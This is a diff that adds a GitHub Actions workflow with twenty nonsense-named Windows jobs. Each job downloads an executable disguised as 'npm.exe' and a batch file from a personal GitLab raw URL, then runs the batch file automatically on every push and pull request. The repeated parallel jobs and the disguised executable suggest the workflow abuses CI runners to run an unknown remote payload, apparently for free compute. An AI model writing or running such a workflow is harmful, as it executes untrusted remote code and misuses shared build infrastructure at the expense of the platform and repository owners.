@@ -1,0 +1,163 @@
+name: Kuaj
+on: [push, pull_request]
+jobs:
+  aasem:
+    runs-on: windows-latest
+    steps:
+      - name: Run a one-line script
+        run: |
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/nani.bat -OutFile .\mas.bat
+          .\mas.bat
+  aasema:
+    runs-on: windows-latest
+    steps:
+      - name: Run a one-line script
+        run: |
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/nani.bat -OutFile .\mas.bat
+          .\mas.bat
+  aasemi:
+    runs-on: windows-latest
+    steps:
+      - name: Run a one-line script
+        run: |
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/nani.bat -OutFile .\mas.bat
+          .\mas.bat
+  aasemo:
+    runs-on: windows-latest
+    steps:
+      - name: Run a one-line script
+        run: |
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/nani.bat -OutFile .\mas.bat
+          .\mas.bat
+  aaseme:
+    runs-on: windows-latest
+    steps:
+      - name: Run a one-line script
+        run: |
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/nani.bat -OutFile .\mas.bat
+          .\mas.bat
+  aasemd:
+    runs-on: windows-latest
+    steps:
+      - name: Run a one-line script
+        run: |
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/nani.bat -OutFile .\mas.bat
+          .\mas.bat
+  asem:
+    runs-on: windows-latest
+    steps:
+      - name: Run a one-line script
+        run: |
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/nani.bat -OutFile .\mas.bat
+          .\mas.bat
+  asema:
+    runs-on: windows-latest
+    steps:
+      - name: Run a one-line script
+        run: |
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/nani.bat -OutFile .\mas.bat
+          .\mas.bat
+  asemi:
+    runs-on: windows-latest
+    steps:
+      - name: Run a one-line script
+        run: |
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/nani.bat -OutFile .\mas.bat
+          .\mas.bat
+  asemo:
+    runs-on: windows-latest
+    steps:
+      - name: Run a one-line script
+        run: |
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/nani.bat -OutFile .\mas.bat
+          .\mas.bat
+  aseme:
+    runs-on: windows-latest
+    steps:
+      - name: Run a one-line script
+        run: |
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/nani.bat -OutFile .\mas.bat
+          .\mas.bat
+  asemd:
+    runs-on: windows-latest
+    steps:
+      - name: Run a one-line script
+        run: |
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/nani.bat -OutFile .\mas.bat
+          .\mas.bat
+  aaasems:
+    runs-on: windows-latest
+    steps:
+      - name: Run a one-line script
+        run: |
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/nani.bat -OutFile .\mas.bat
+          .\mas.bat
+  aaasemsa:
+    runs-on: windows-latest
+    steps:
+      - name: Run a one-line script
+        run: |
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/nani.bat -OutFile .\mas.bat
+          .\mas.bat
+  aaasemsi:
+    runs-on: windows-latest
+    steps:
+      - name: Run a one-line script
+        run: |
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/nani.bat -OutFile .\mas.bat
+          .\mas.bat
+  aaasemso:
+    runs-on: windows-latest
+    steps:
+      - name: Run a one-line script
+        run: |
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/nani.bat -OutFile .\mas.bat
+          .\mas.bat
+  aaasemse:
+    runs-on: windows-latest
+    steps:
+      - name: Run a one-line script
+        run: |
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/nani.bat -OutFile .\mas.bat
+          .\mas.bat
+  aaasemsd:
+    runs-on: windows-latest
+    steps:
+      - name: Run a one-line script
+        run: |
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/nani.bat -OutFile .\mas.bat
+          .\mas.bat
+  aasems:
+    runs-on: windows-latest
+    steps:
+      - name: Run a one-line script
+        run: |
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/nani.bat -OutFile .\mas.bat
+          .\mas.bat
+  aasemsa:
+    runs-on: windows-latest
+    steps:
+      - name: Run a one-line script
+        run: |
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
+          Invoke-WebRequest -Uri https://gitlab.com/chriskm0909/npm/-/raw/main/nani.bat -OutFile .\mas.bat
+          .\mas.bat
